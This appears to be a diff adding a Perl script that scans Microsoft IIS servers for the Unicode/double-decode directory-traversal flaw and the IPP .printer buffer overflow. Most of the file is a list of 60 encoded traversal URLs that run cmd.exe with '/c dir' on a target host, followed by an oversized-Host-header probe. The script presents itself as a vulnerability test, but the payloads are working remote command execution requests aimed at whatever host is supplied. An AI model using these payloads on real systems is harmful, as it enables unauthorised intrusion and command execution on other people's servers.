@@ -1,0 +1,207 @@
+#!/usr/bin/perl -w
+#
+#   IIS 3/4/5 Unicode/IPP Test
+#
+#   Main Code by: B-r00t
+#   IPP Test by: paul@moquijo.com
+#                Based on code by storm@stormdev.net
+#
+#   All in one Modifications by: NoCoNFLiC
+#
+#
+use strict;
+use IO::Socket;
+
+my $host;               # Host being probed.
+my $port;               # Webserver port.
+my @results;            # Results from server.
+my $probe;              # Whether to display output.
+my @U;                  # Unicode URLS.
+my $url;
+
+# URLS - Feel free to add here.
+$U[1] = "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[2] = "/scripts..%c1%9c../winnt/system32/cmd.exe?/c+dir";
+$U[3] = "/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir";
+$U[4] = "/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+dir";
+$U[5] = "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+dir";
+$U[6] = "/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+dir";
+$U[7] = "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";
+$U[8] = "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";
+$U[9] = "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+dir";
+$U[10] = "/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+dir";
+$U[11] = "/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+dir";
+$U[12] = "/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
+$U[13] = "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
+$U[14] = "/msadc/..\%e0\%80\%af../..\%e0\%80\%af../..\%e0\%80\%af../winnt/system32/cmd.exe\?/c\+dir";
+$U[15] = "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[16] = "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[17] = "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[18] = "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[19] = "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[20] = "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[21] = "/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[22] = "/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+dir";
+$U[23] = "/scripts/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+dir";
+$U[24] = "/scripts/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+dir";
+$U[25] = "/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+dir";
+$U[26] = "/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir";
+$U[27] = "/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";
+$U[28] = "/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir";
+$U[29] = "/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[30] = "/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[31] = "/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
+$U[32] = "/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
+$U[33] = "/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir";
+$U[34] = "/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
+$U[35] = "/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
+$U[36] = "/PBServer/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
+$U[37] = "/PBServer/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir ";
+$U[38] = "/PBServer/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
+$U[39] = "/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir";
+$U[40] = "/Rpc/..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
+$U[41] = "/Rpc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+dir";
+$U[42] = "/Rpc/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
+$U[43] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir";
+$U[44] = "/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir";
+$U[45] = "/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[46] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[47] = "/iisadmpwd/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[48] = "/iisadmpwd/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir";
+$U[49] = "/iisadmpwd/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir";
+$U[50] = "/iisadmpwd/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir";
+$U[51] = "/iishelp/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir";
+$U[52] = "/iishelp/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+dir";
+$U[53] = "/iishelp/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[54] = "/iishelp/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
+$U[55] = "/iishelp/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+dir";
+$U[56] = "/iishelp/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+dir";
+$U[57] = "/iishelp/..%c0%af../winnt/system32/cmd.exe?/c+dir";
+$U[58] = "/iishelp/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir";
+$U[59] = "/cgi-bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir";
+$U[60] = "/cgi-bin/..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+dir";
+
+# --------------init
+if ($#ARGV<0) { die
+"Usage: isstest.pl [IP:port]
+   ex: iistest.pl 127.0.0.1:80 \n
+";}
+
+($host,$port)=split(/:/,$ARGV[0]);
+print "\n";
+
+
+&server;
+&scan;
+
+
+sub server {
+my $X;
+print "Trying to obtain IIS Server string ...\n";
+$probe = "string";
+my $output;
+my $webserver = "something";
+&connect1;
+for ($X=0; $X<=10; $X++){
+        $output = $results[$X];
+        if (defined $output){
+        if ($output =~/IIS/){ $webserver = "iis" };
+        };
+};
+
+if ($webserver ne "iis"){ print "\nFailed !\n\n";
+exit };
+   print "\nOK... Seems To Be Micro\$oft IIS.\n"; };
+
+sub scan {
+my $status = "not_vulnerable";
+
+print "\nScanning Webserver $host on port $port ...\n\n";
+my $loop;
+my $output;
+my $flag;
+for ($loop=1; $loop < @U; $loop++) {
+$flag = "0";
+$url = $U[$loop];
+$probe = "scan";
+&connect1;
+
+# Un-Comment For slower scan.
+#sleep 1;
+
+foreach $output (@results){
+if ($output =~ /Directory/) {
+    $flag = "1";
+    $status = "vulnerable";
+   }; };
+if ($flag eq "0") { print "\n$host is not vulnerable to URL Number $loop."; }
+else { print "\n$host IS VULNERABLE TO URL NUMBER $loop !!!"; };
+ };
+if ($status eq "not_vulnerable"){ print "\n$host is NOT Vulnerable.\n";
+ }; };
+# end scan subroutine.
+
+sub connect1 {
+my $connection = IO::Socket::INET->new (
+                                Proto => "tcp",
+                                PeerAddr => "$host",
+                                PeerPort => "$port",
+                                ) or die "\nERROR: Unable To Connect To $host On Port $port.\n\n";
+$connection -> autoflush(1);
+if ($probe =~/scan/) { print $connection "GET $url HTTP/1.0\r\n\r\n"; }
+elsif ($probe =~/string/) { print $connection "HEAD / HTTP/1.0\r\n\r\n"; };
+
+while ( <$connection> ) {
+                        @results = <$connection>;
+                         };
+close $connection; };
+
+print "\n\nURL Test Completed.";
+sleep 1;
+
+##########################################
+#       IPP test
+##########################################
+print "\n\n";
+print "-- IPP - IIS 5.0 Vulnerability Test --\n";
+print "Sending test probe to host: " . $host . "\n\n";
+
+my $target;
+my $result=join('',sendexplt("GET /NULL.printer HTTP/1.1\n" . "Host: " . "A" x 257 . "\n\n"));
+
+if (not $result) {
+        print "The server tested has been patched for the IPP vulnerability\n\n";
+        exit;
+}
+
+if ($result =~ ?HTTP/1.1 500?) {
+        print "The server tested has the IPP vulnerability!\n\n";
+        exit;
+}
+
+if ($result =~ ?HTTP/1.1 404?) {
+        print "The server has had the .printer mapping removed.\n\n";
+        exit;
+}
+
+print "An unexpected response has been received:\n";
+print $result;
+exit;
+
+sub sendexplt {
+        my ($pstr)=@_;
+        $target= inet_aton($host) || die("inet_aton problems");
+        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+                die("Socket problems\n");
+        if(connect(S,pack "SnA4x8",2,80,$target)){
+                select(S);
+                $|=1;
+                print $pstr;
+                my @in=<S>;
+                select(STDOUT);
+                close(S);
+                return @in;
+        } else {
+                die("Can't connect...\n");
+        }
+}
